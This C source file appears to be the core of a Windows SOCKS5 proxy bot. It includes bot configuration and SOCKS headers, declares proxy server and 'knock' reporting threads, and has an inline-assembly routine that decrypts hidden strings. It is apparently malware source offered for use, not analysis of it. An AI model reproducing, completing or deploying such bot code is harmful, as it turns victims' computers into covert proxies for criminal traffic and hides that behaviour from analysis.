/*
	+ System Includes
*/
#include < winsock2.h>
#include < C:\Program Files\Microsoft Platform SDK for Windows Server 2003 R2\Include\Windns.h>
#include < windows.h>
#include < stdlib.h>
#include < time.h>
#include < stdio.h> 
#include < winioctl.h>
#include < tlhelp32.h >
#include < Wininet.h >
#include < C:\Program Files\Microsoft Platform SDK for Windows Server 2003 R2\Include\Psapi.h >
/*
	+ Lib include
*/
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\ws2_32.lib")
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\Wininet.lib")
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\Psapi.lib")
#pragma comment(lib, "C:\\Program Files\\Microsoft Platform SDK for Windows Server 2003 R2\\Lib\\Dnsapi.lib")
#pragma warning(disable:4035)
#pragma warning(disable:4090)
/*
	+ Global variables
*/
BOOL	g_bCreated = FALSE,
		g_bDie = FALSE;
HANDLE	g_hThread = 0;
HANDLE	hThreadSocks5 = 0;
DWORD	dwThreadId = 0;
DWORD	g_dwThreadId = 0;

#include "bot_struct.h"

/*
	+ Functions Defination
*/
BOOL	SocksSendError(BYTE ErrorType,SOCKET hSock);
DWORD	WINAPI SocksClientThread(LPVOID pParam);
DWORD	WINAPI SocksLoopBytes(LPVOID pParam);
DWORD	WINAPI Socks5(LPVOID pParam);
DWORD	WINAPI StartSocksServer(LPVOID pParam);
void	SocksLoop(PSOCKS_CONNECT sConn);
BOOL	SocksLogin(SOCKS_AUTH_REQ sAReq);
BOOL	SocksCheckMethod(PSOCKS_CONNECT sConnect,PSOCKS_CONNECT_REQUEST pConReq);
BOOL	SocksAuth(SOCKET hClient);
BOOL	SocksInitUserInfo(PSOCKS_USER_INFO pUInfo,BOT_OPTIONS *pOpt);
BOOL	SocksKnockStat(PBOT_OPTIONS pBotOpt); 
USHORT	GetRandomPort();
static int resolve_hostname (const char *host, unsigned long *ip);

/*
	+ Bot Includes
*/

char * WINAPI DeCrypt( char *pStr );

#define NTSIGNATURE(a) ((PVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew))
#include "bot_random.h"
#include "bot_debug.h"
#include "bot_api.h"
#include "bot_socks_auth.h"
#include "bot_socks_transfer.h"
#include "bot_socks.h"
#include "bot_config.h"

char * 
WINAPI DeCrypt( char *pStr )
{
	PCHAR szTempBuf = malloc(256);
	__asm
	{
		pushad
		mov		esi,[pStr]
		mov		edi,szTempBuf
	__again:
			lodsb
			test	al,al
			jz		__to_exit
			sub		al,77h
			xor		al,33h
			add		al,31h
			stosb
			jmp		__again

	__to_exit:
		stosb
		popad
	} // end asm

	return szTempBuf;
} // end of fucntion eL_DeCrypt